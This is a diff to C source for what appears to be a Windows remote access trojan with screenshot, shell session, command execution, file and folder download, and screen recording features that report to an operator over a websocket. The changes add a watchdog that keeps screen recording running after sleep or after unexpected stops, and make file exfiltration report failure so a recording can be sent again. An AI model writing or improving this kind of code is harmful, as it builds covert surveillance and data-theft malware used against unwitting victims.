@@ -355,7 +355,7 @@ void send_websocket_ping();
 void take_screenshot();
 void shell_session();
 void list_processes();
-void download_file(const char* filename);
+int download_file(const char* filename);  // Returns 1 on success, 0 on failure
 void download_folder(const char* foldername);
 void execute_command(const char* cmd);
 void change_directory(const char* path);
@@ -395,38 +395,46 @@ void delete_screenrecord();
 DWORD WINAPI screenrecord_thread(LPVOID param);
 DWORD WINAPI power_monitor_thread(LPVOID param);
 
-// Power monitor for sleep/wake detection
+// Screen recording watchdog for sleep/wake detection and recovery
 static HANDLE g_power_monitor_thread = NULL;
 static volatile int g_power_monitor_running = 0;
 
-// Power event monitor thread - restarts recording after wake from sleep
+// Watchdog thread - monitors for wake events and ensures recording stays running
+// Uses GetTickCount64 to detect sleep (time jumps forward when system wakes)
 DWORD WINAPI power_monitor_thread(LPVOID param) {
-    // Create a hidden window to receive power broadcast messages
-    WNDCLASSA wc = {0};
-    wc.lpfnWndProc = DefWindowProcA;
-    wc.hInstance = GetModuleHandle(NULL);
-    wc.lpszClassName = "PowerMonitorClass";
-    RegisterClassA(&wc);
+    ULONGLONG last_check = GetTickCount64();
+    DWORD last_real_time = (DWORD)(time(NULL));
     
-    HWND hwnd = CreateWindowExA(0, "PowerMonitorClass", "", 0, 0, 0, 0, 0, 
-                                 HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
-    
-    MSG msg;
-    while (g_power_monitor_running && GetMessage(&msg, NULL, 0, 0)) {
-        if (msg.message == WM_POWERBROADCAST) {
-            if (msg.wParam == PBT_APMRESUMEAUTOMATIC || msg.wParam == PBT_APMRESUMESUSPEND) {
-                // System woke from sleep - restart recording if enabled
-                Sleep(2000);  // Wait for system to stabilize
-                if (g_screenrecord_enabled && !g_screenrecord_running) {
-                    start_screenrecord_internal();
-                }
+    while (g_power_monitor_running) {
+        Sleep(5000);  // Check every 5 seconds
+        
+        ULONGLONG now = GetTickCount64();
+        DWORD real_now = (DWORD)(time(NULL));
+        
+        // Detect wake from sleep: real time jumped more than tick time
+        // During sleep, GetTickCount64 pauses but real time continues
+        ULONGLONG tick_diff = (now - last_check) / 1000;  // Seconds elapsed per ticks
+        DWORD real_diff = real_now - last_real_time;       // Actual seconds elapsed
+        
+        // If real time advanced more than 30 seconds beyond tick time, we woke from sleep
+        if (real_diff > tick_diff + 30) {
+            // System woke from sleep - wait for stabilization then restart recording
+            Sleep(3000);
+            if (g_screenrecord_enabled && !g_screenrecord_running) {
+                start_screenrecord_internal();
             }
         }
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
+        
+        // Also serve as a general watchdog - if recording should be on but isn't, start it
+        // This handles cases where recording stopped unexpectedly
+        if (g_screenrecord_enabled && !g_screenrecord_running && g_connected) {
+            start_screenrecord_internal();
+        }
+        
+        last_check = now;
+        last_real_time = real_now;
     }
     
-    if (hwnd) DestroyWindow(hwnd);
     return 0;
 }
 
@@ -1368,7 +1376,7 @@ void list_processes() {
     send_websocket_data("\n", 1);
 }
 
-void download_file(const char* filename) {
+int download_file(const char* filename) {
     // Strip leading/trailing whitespace from filename
     char clean_name[MAX_PATH];
     const char* start = filename;
@@ -1392,7 +1400,7 @@ void download_file(const char* filename) {
             char err_msg[512];
             sprintf(err_msg, "[!] File not found: %s\n", clean_name);
             send_websocket_data(err_msg, strlen(err_msg));
-            return;
+            return 0;  // Failure
         }
     }
     
@@ -1418,7 +1426,7 @@ void download_file(const char* filename) {
     sprintf(header, "<<<FILE_START>>>%s|%lld<<<NAME_END>>>", base_name, size);
     if (!send_websocket_data(header, strlen(header))) {
         fclose(file);
-        return;
+        return 0;  // Failure
     }
     Sleep(100);
     
@@ -1427,8 +1435,9 @@ void download_file(const char* filename) {
     char b64_buffer[4100];  // Base64 output buffer
     long long total_sent = 0;
     int chunk_count = 0;
+    int transfer_failed = 0;
     
-    while (!feof(file) && g_connected) {
+    while (!feof(file) && g_connected && !transfer_failed) {
         size_t bytes_read = fread(read_buffer, 1, sizeof(read_buffer), file);
         if (bytes_read == 0) break;
         
@@ -1439,8 +1448,8 @@ void download_file(const char* filename) {
         // Send the base64 chunk
         if (!send_websocket_data(b64_buffer, b64_len)) {
             send_websocket_data("\n[!] Transfer failed\n", 21);
-            fclose(file);
-            return;
+            transfer_failed = 1;
+            break;
         }
         
         total_sent += bytes_read;
@@ -1455,12 +1464,20 @@ void download_file(const char* filename) {
     
     fclose(file);
     
+    if (transfer_failed || !g_connected) {
+        return 0;  // Failure
+    }
+    
     Sleep(150);
-    send_websocket_data("<<<FILE_END>>>", 14);
+    if (!send_websocket_data("<<<FILE_END>>>", 14)) {
+        return 0;  // Failure - end marker not sent
+    }
     
     char done_msg[128];
     sprintf(done_msg, "\n[+] Download complete: %lld bytes sent\n", total_sent);
     send_websocket_data(done_msg, strlen(done_msg));
+    
+    return 1;  // Success
 }
 
 void execute_command(const char* cmd) {
@@ -3392,12 +3409,30 @@ void download_screenrecord() {
         send_websocket_data("[*] Downloading recording...\n", 29);
     }
     
-    download_file(g_screenrecord_path);
+    // Save current path in case download fails
+    char saved_path[MAX_PATH];
+    strcpy(saved_path, g_screenrecord_path);
     
-    // Auto-restart if it was running and enabled
+    int download_success = download_file(g_screenrecord_path);
+    
+    if (!download_success) {
+        // Download failed - restore path and don't restart
+        // This preserves the recording file for retry
+        strcpy(g_screenrecord_path, saved_path);
+        send_websocket_data("[!] Download failed - recording preserved, try 'getrecord' again\n", 65);
+        
+        // If it was running, restart it to continue recording to the SAME file
+        if (was_running && g_screenrecord_enabled) {
+            send_websocket_data("[*] Continuing recording...\n", 28);
+            start_screenrecord_internal();  // Will continue with existing path
+        }
+        return;
+    }
+    
+    // Auto-restart if it was running and enabled - ONLY on successful download
     if (was_running && g_screenrecord_enabled) {
-        send_websocket_data("[*] Restarting recording...\n", 28);
-        g_screenrecord_path[0] = '\0';  // New file
+        send_websocket_data("[*] Restarting recording (new file)...\n", 39);
+        g_screenrecord_path[0] = '\0';  // New file ONLY after successful download
         start_screenrecord_internal();
     }
 }
